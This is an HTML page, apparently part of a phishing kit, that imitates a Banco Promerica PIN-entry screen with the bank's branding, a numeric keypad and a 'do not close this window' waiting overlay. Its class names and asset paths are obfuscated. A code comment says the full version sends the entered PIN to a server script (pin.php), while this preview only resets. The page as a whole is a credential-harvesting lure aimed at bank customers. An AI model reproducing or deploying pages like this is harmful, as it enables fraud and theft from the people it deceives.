<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco Promerica - Digita tu PIN</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}

html,body{
    font-family:'Segoe UI',Arial,sans-serif;
    background:#fff;
    color:#222;
    min-height:100vh;
    overflow-x:hidden;
}

body{
    display:flex;
    flex-direction:column;
    min-height:100vh;
}

.hdR2y{
    background:#00853f;
    color:#fff;
    padding:14px 18px;
    display:flex;
    align-items:center;
    justify-content:space-between;
}

.hdR2y .lwS4p{
    display:flex;
    align-items:center;
}

.hdR2y img.lgT8b{
    height:40px;
    width:auto;
    object-fit:contain;
    filter:brightness(0) invert(1);
}

.hdR2y .loT6m{
    color:#fff;
    background:transparent;
    border:none;
    cursor:pointer;
    padding:4px;
    display:flex;
    align-items:center;
}

.hdR2y .loT6m svg{
    width:22px;
    height:22px;
}

.cnB1v{
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding:36px 20px 40px;
    position:relative;
}

.ttQ8j{
    font-size:18px;
    color:#222;
    font-weight:400;
    margin-bottom:28px;
}

.pdK3z{
    display:flex;
    gap:14px;
    margin-bottom:42px;
    min-height:32px;
}

.ptN5x{
    width:18px;
    height:24px;
    color:#bdbdbd;
    font-size:34px;
    line-height:0.5;
    display:flex;
    align-items:center;
    justify-content:center;
    transition:color .2s;
}

.ptN5x.fdH9c{
    color:#444;
}

.kpL2r{
    display:grid;
    grid-template-columns:repeat(3, 80px);
    gap:18px 26px;
    justify-content:center;
}

.kyW7s{
    width:80px;
    height:80px;
    border-radius:50%;
    border:1.5px solid #cfcfcf;
    background:#fff;
    color:#222;
    font-size:26px;
    font-weight:400;
    cursor:pointer;
    transition:0.15s;
    display:flex;
    align-items:center;
    justify-content:center;
    user-select:none;
}

.kyW7s:hover{
    background:#f3f3f3;
}

.kyW7s:active{
    background:#e6f4ec;
    border-color:#00853f;
}

.kyW7s.emA4n{
    border:none;
    cursor:default;
    background:transparent;
}

.kyW7s.emA4n:hover{
    background:transparent;
}

.kyW7s.ekP9s{
    border:none;
    background:#00853f;
    color:#fff;
    clip-path:polygon(20% 0%, 100% 0%, 100% 100%, 20% 100%, 0% 50%);
    border-radius:0;
    width:74px;
    height:54px;
}

.kyW7s.ekP9s:hover{
    background:#006b32;
}

.kyW7s.ekP9s svg{
    width:22px;
    height:22px;
}

.loZ8d{
    position:fixed;
    inset:0;
    background:#fff;
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    z-index:9999;
}

.loZ8d.shB1k{
    display:flex;
}

.loZ8d h2{
    color:#006838;
    font-size:22px;
    font-weight:600;
    margin-bottom:8px;
}

.loZ8d p{
    color:#888;
    font-size:14px;
    margin-bottom:24px;
}

.loZ8d .spR4m{
    width:60px;
    height:60px;
    border:6px solid #eee;
    border-top:6px solid #006838;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}

.bsG2q{
    position:relative;
    width:100%;
    height:110px;
    margin-top:auto;
    overflow:hidden;
    pointer-events:none;
}

.bsG2q svg{
    position:absolute;
    bottom:0;
    left:0;
    width:100%;
    height:100%;
    display:block;
}

@media(max-width:380px){
    .kpL2r{
        grid-template-columns:repeat(3, 70px);
        gap:14px 22px;
    }
    .kyW7s{width:70px;height:70px;font-size:24px;}
    .kyW7s.ekP9s{width:64px;height:48px;}
}
</style>
</head>
<body>

<header class="hdR2y">
    <div class="lwS4p">
        <img src="img/lg_p4n8q3.png" alt="Banco Promerica" class="lgT8b">
    </div>
    <button type="button" class="loT6m" onclick="window.location.href='index.html'" aria-label="Salir">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
            <polyline points="16 17 21 12 16 7"></polyline>
            <line x1="21" y1="12" x2="9" y2="12"></line>
        </svg>
    </button>
</header>

<main class="cnB1v">
    <p class="ttQ8j">Digita tu PIN</p>

    <div class="pdK3z" id="pDw9h">
        <div class="ptN5x">*</div>
        <div class="ptN5x">*</div>
        <div class="ptN5x">*</div>
        <div class="ptN5x">*</div>
    </div>

    <div class="kpL2r" id="kpL2r">
        <button type="button" class="kyW7s" data-num="1">1</button>
        <button type="button" class="kyW7s" data-num="2">2</button>
        <button type="button" class="kyW7s" data-num="3">3</button>
        <button type="button" class="kyW7s" data-num="4">4</button>
        <button type="button" class="kyW7s" data-num="5">5</button>
        <button type="button" class="kyW7s" data-num="6">6</button>
        <button type="button" class="kyW7s" data-num="7">7</button>
        <button type="button" class="kyW7s" data-num="8">8</button>
        <button type="button" class="kyW7s" data-num="9">9</button>
        <div class="kyW7s emA4n"></div>
        <button type="button" class="kyW7s" data-num="0">0</button>
        <button type="button" class="kyW7s ekP9s" id="bDn8s" aria-label="Borrar">
            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </button>
    </div>
</main>

<div class="loZ8d" id="lOx4t">
    <h2>Por favor espera…</h2>
    <p>⚠️ No cierres esta ventana ni salgas de la página</p>
    <div class="spR4m"></div>
</div>

<div class="bsG2q" aria-hidden="true">
    <svg viewBox="0 0 500 110" preserveAspectRatio="none">
        <polygon points="0,110 200,40 220,110" fill="#00853f"/>
        <polygon points="180,110 320,70 340,110" fill="#7cc04a"/>
        <polygon points="300,110 500,30 500,110" fill="#00853f"/>
        <polygon points="380,110 500,80 500,110" fill="#7cc04a"/>
    </svg>
</div>

<script>
(function(){
    const dots    = document.querySelectorAll('#pDw9h .ptN5x');
    const kpL2r  = document.getElementById('kpL2r');
    const overlay = document.getElementById('lOx4t');
    const MAX     = 4;
    let pin = '';
    let submitting = false;

    function render(){
        dots.forEach((d, i) => {
            d.classList.toggle('fdH9c', i < pin.length);
        });
    }

    function fakeSubmit(){
        if (submitting) return;
        submitting = true;
        overlay.classList.add('shB1k');
        // Demo: en pin.php aquí se envía el formulario al servidor.
        // En este preview, mantener el overlay visible 2.5s y luego reset.
        setTimeout(() => {
            overlay.classList.remove('shB1k');
            pin = '';
            render();
            submitting = false;
        }, 2500);
    }

    kpL2r.addEventListener('click', e => {
        if (submitting) return;
        const numBtn = e.target.closest('[data-num]');
        const delBtn = e.target.closest('#bDn8s');

        if (numBtn) {
            if (pin.length < MAX) {
                pin += numBtn.dataset.num;
                render();
                if (pin.length === MAX) {
                    setTimeout(fakeSubmit, 200);
                }
            }
        } else if (delBtn) {
            pin = pin.slice(0, -1);
            render();
        }
    });

    document.addEventListener('keydown', e => {
        if (submitting) return;
        if (e.key >= '0' && e.key <= '9' && pin.length < MAX) {
            pin += e.key;
            render();
            if (pin.length === MAX) {
                setTimeout(fakeSubmit, 200);
            }
        } else if (e.key === 'Backspace') {
            pin = pin.slice(0, -1);
            render();
        }
    });
})();
</script>
</body>
</html>
